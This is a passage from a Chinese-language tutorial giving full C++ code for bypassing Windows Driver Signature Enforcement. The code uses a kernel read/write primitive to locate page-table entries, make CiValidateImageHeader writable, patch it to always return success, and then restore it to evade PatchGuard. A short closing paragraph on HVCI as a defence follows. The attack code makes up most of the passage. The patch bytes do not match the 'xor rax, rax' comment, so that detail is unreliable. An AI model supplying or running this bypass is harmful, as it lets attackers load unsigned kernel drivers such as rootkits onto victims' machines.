
### 3.2 完整代码实现

**1. 获取 `MiGetPteAddress` 函数地址及 PTE 参数**

```cpp
// 获取 MiGetPteAddress 函数地址
DWORD_PTR miGetPteAddressFuncRVA = GetMiGetPteAddressFuncRVA();
cout << "MiGetPteAddress函数RVA：0x" << hex << miGetPteAddressFuncRVA << endl;
PVOID miGetPteAddressFunc = (PBYTE)kernelBase + miGetPteAddressFuncRVA;
PVOID miGetPteAddressFuncInImage = (PBYTE)gKernelImageBase + miGetPteAddressFuncRVA;
cout << "MiGetPteAddress函数地址：0x" << hex << (DWORD_PTR)miGetPteAddressFunc << endl;
// 读取 PTE 基址和计算参数
DWORD64 pteBaseAddress = 0;
KernelReadMemory((PBYTE)miGetPteAddressFunc + 19, (PBYTE)&pteBaseAddress, sizeof(pteBaseAddress));
BYTE uValueA = *(BYTE*)((DWORD64)miGetPteAddressFuncInImage + 0x03);
DWORD64 uValueB = *(DWORD64*)((DWORD64)miGetPteAddressFuncInImage + 0x06);
cout << "uValueA：0x" << hex << (DWORD)uValueA << endl;
cout << "uValueB：0x" << hex << uValueB << endl;
cout << "PTE基址：0x" << hex << pteBaseAddress << endl;
```

通过反汇编分析，我们可以准确提取出计算 PTE 地址所需的参数，这是实现内存权限修改的关键步骤。

**2. 计算 `CiValidateImageHeader` 函数的 PTE 地址**

```cpp
// 获取 CiValidateImageHeader 函数地址
PVOID pCiValidateImageHeader = (PVOID)((DWORD_PTR)gCiBase + GetCiValidateImageHeaderRVA());
cout << "CiValidateImageHeader函数地址：0x" << hex << (DWORD_PTR)pCiValidateImageHeader << endl;
// 计算 PTE 地址
ULONGLONG address = (ULONGLONG)pCiValidateImageHeader;
ULONG64* pte = (ULONG64*)((address >> uValueA & uValueB) + pteBaseAddress);
cout << hex << "PTE地址：0x" << (DWORD_PTR)pte << endl;
```

可以借助 WinDbg 的 `!pte [Address]` 指令来确定 PTE 地址是否正确。

**3. 修改 PTE 权限**

```cpp
// 读取并修改 PTE 值，设置可写标志
DWORD64 pteValue = 0;
KernelReadMemory(pte, (PBYTE)&pteValue, sizeof(pteValue));
// 设置可写标志（第1位）
pteValue = pteValue | 2;
KernelWriteMemory(pte, (PBYTE)&pteValue, sizeof(pteValue));
```

**4. 实施热修补**

```cpp
// 备份原始代码
BYTE originalValue[4] = { 0 };
KernelReadMemory(pCiValidateImageHeader, originalValue, sizeof(originalValue));
// 写入补丁：xor rax, rax; ret (返回 STATUS_SUCCESS)
KernelWriteMemory(pCiValidateImageHeader, (PBYTE)"\x48\x30\xc0\xc3", 4);
cout << "已成功修改 CiValidateImageHeader 函数，DSE 已绕过！" << endl;
```

**5. 写完要马上恢复原始状态，否则会触发 PatchGuard 蓝屏**

```cpp
// 恢复原始代码
KernelWriteMemory(pCiValidateImageHeader, originalValue, sizeof(originalValue));
// 恢复 PTE 权限
pteValue = pteValue ^ 2; // 清除可写标志
KernelWriteMemory(pte, (PBYTE)&pteValue, sizeof(pteValue));
```

**7. 防护策略**

HVCI 通过 Hypervisor 利用 SLAT/EPT/NPT 提供的硬件虚拟化能力，在比普通内核更高的特权级别（Ring -1） 上管控内存页权限，普通内核态代码无法修改 Hypervisor 维护的页表。

在启用 HVCI 的环境下，可执行的内存页会被标记为只读且可执行（禁止写入），可写入的内存页（如数据区）会被标记为可写但不可执行。
